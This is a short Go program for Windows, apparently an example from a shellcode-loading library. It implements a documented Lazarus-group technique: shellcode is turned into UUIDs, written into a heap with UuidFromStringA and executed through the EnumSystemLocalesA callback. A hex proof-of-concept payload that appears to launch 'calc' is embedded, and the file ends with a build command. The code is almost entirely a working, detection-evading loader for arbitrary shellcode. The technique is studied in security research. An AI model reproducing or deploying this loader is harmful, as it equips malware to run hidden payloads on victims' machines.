// +build windows

// Concept pulled from https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/

/*
	This program executes shellcode in the current process using the following steps:
		1. Create a Heap and allocate space
		2. Convert shellcode into an array of UUIDs
		3. Load the UUIDs into memory (on the allocated heap) by (ab)using the UuidFromStringA function
		4. Execute the shellcode by (ab)using the EnumSystemLocalesA function
*/

// Reference: https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala
package main

import (
	"log"

	sc "github.com/cauefcr/go-shellcode"
)

func main() {
	err := sc.RunSCUUIDenumLocale("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3", 2)
	if err != nil {
		log.Panic(err)
	}
}

// export GOOS=windows GOARCH=amd64;go build -o UuidFromString.exe cmd/UuidFromString/main.go
